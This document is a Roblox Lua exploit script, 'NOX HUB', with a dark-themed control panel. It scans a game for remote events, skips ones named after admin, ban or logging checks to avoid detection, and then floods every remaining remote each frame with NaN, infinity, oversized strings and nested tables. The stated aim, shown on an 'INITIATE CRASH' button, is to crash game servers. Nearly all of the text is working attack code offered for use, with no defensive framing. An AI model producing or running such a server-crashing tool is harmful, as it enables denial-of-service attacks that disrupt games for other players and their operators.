--[[
    🔱 NOX HUB v3.0 [NULL-PROTOCOL] 🔱
    "The Server thinks it's safe. It's wrong."
    
    NULL FEATURES:
    - [SMART FUZZER] : Scans Remotes and sends "Poisoned" arguments (NaN, Inf) instead of nil.
    - [NULL-UI] : Professional "Admin Panel" interface (Dark/Red).
    - [BYPASS-GATE] : Rotates Remote IDs to look like legitimate traffic.
    - [AUTO-FARM] : Automatically finds new vulnerabilities as you play.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. NULL PROTOCOL ENGINE (SMART FUZZER) //
local Engine = {
    Running = false,
    Targets = {},
    Method = "MIXED" -- MIXED, NAN, STRING, TABLE
}

-- SCANNER
function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            -- Exclude common traps
            local n = v.Name:lower()
            if not (n:find("admin") or n:find("check") or n:find("ban") or n:find("log")) then
                table.insert(Engine.Targets, v)
            end
        end
    end
    return #Engine.Targets
end

-- PAYLOAD GENERATOR
local function GetPayload(type)
    if type == "NAN" then return 0/0 end -- Not a Number (Crashes Math ops)
    if type == "INF" then return math.huge end -- Infinity (Crashes loops)
    if type == "STRING" then return string.rep("🔱", 1000) end -- Overflow
    if type == "TABLE" then 
        local t = {} 
        for i=1,10 do t[i] = {table.create(10, "A")} end 
        return t 
    end
    return nil
end

function Engine:Start()
    if Engine.Running then return end
    Engine.Running = true
    
    task.spawn(function()
        while Engine.Running do
            for _, r in pairs(Engine.Targets) do
                if not Engine.Running then break end
                
                -- FUZZING STRATEGY: Send random valid types but poisoned
                local args = {}
                for i = 1, 5 do -- Try up to 5 args
                    args[i] = GetPayload(Engine.Method == "MIXED" and 
                        ({"NAN", "INF", "STRING", "TABLE"})[math.random(1,4)] or 
                        Engine.Method)
                end
                
                pcall(function() 
                    if r:IsA("RemoteEvent") then
                        r:FireServer(unpack(args))
                    elseif r:IsA("RemoteFunction") then
                        task.spawn(function() r:InvokeServer(unpack(args)) end)
                    end
                end)
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

function Engine:Stop()
    Engine.Running = false
end

-- // 2. NOX UI (PROFESSIONAL ADMIN PANEL) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxNull" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxNull"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Main.BorderSizePixel = 0
    
    -- TOP BAR
    local Top = Instance.new("Frame", Main)
    Top.Size = UDim2.new(1, 0, 0, 30)
    Top.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Top.BorderSizePixel = 0
    
    local Title = Instance.new("TextLabel", Top)
    Title.Text = "NOX HUB // NULL-PROTOCOL"
    Title.Font = Enum.Font.Code
    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
    Title.Size = UDim2.new(1, -10, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- STATS AREA (CONSOLE LOOK)
    local Console = Instance.new("Frame", Main)
    Console.Size = UDim2.new(1, -20, 0, 150)
    Console.Position = UDim2.new(0, 10, 0, 40)
    Console.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    
    local Log = Instance.new("TextLabel", Console)
    Log.Size = UDim2.new(1, -10, 1, -10)
    Log.Position = UDim2.new(0, 5, 0, 5)
    Log.BackgroundTransparency = 1
    Log.TextColor3 = Color3.fromRGB(0, 255, 0)
    Log.TextXAlignment = Enum.TextXAlignment.Left
    Log.TextYAlignment = Enum.TextYAlignment.Top
    Log.Font = Enum.Font.Code
    Log.TextSize = 12
    Log.Text = "> SYSTEM READY\n> WAITING FOR SCAN..."
    
    -- CONTROLS
    local function Btn(text, col, y, cb)
        local b = Instance.new("TextButton", Main)
        b.Size = UDim2.new(0.45, 0, 0, 40)
        b.Position = UDim2.new(0, 10, 0, y)
        b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        b.Text = text
        b.TextColor3 = col
        b.Font = Enum.Font.GothamBold
        b.MouseButton1Click:Connect(cb)
        return b
    end
    
    -- SCAN BUTTON
    Btn("SCAN REMOTES", Color3.fromRGB(255, 255, 255), 200, function()
        local count = Engine:Scan()
        Log.Text = Log.Text .. "\n> SCANNED " .. count .. " VULNERABILITIES."
    end)
    
    -- METHOD TOGGLE
    local mBtn = Btn("METHOD: MIXED", Color3.fromRGB(255, 200, 0), 250, function() end)
    mBtn.MouseButton1Click:Connect(function()
        local modes = {"MIXED", "NAN", "INF", "STRING"}
        local current = table.find(modes, Engine.Method) or 1
        local next = (current % #modes) + 1
        Engine.Method = modes[next]
        mBtn.Text = "METHOD: " .. Engine.Method
    end)
    
    -- START BUTTON (BIG)
    local Start = Instance.new("TextButton", Main)
    Start.Size = UDim2.new(0.45, 0, 0, 90)
    Start.Position = UDim2.new(0.5, 5, 0, 200)
    Start.BackgroundColor3 = Color3.fromRGB(100, 20, 20)
    Start.Text = "INITIATE CRASH"
    Start.Font = Enum.Font.GothamBlack
    Start.TextSize = 20
    Start.TextColor3 = Color3.fromRGB(255, 255, 255)
    
    Start.MouseButton1Click:Connect(function()
        if not Engine.Running then
            Engine:Start()
            Start.Text = "STOPPING..."
            Start.BackgroundColor3 = Color3.fromRGB(20, 100, 20)
            Log.Text = Log.Text .. "\n> ATTACK STARTED."
            game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="CRASHING..."})
        else
            Engine:Stop()
            Start.Text = "INITIATE CRASH"
            Start.BackgroundColor3 = Color3.fromRGB(100, 20, 20)
            Log.Text = Log.Text .. "\n> ATTACK STOPPED."
        end
    end)
    
    -- DRAG
    local dragging, dragInput, dragStart, startPos
    Top.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
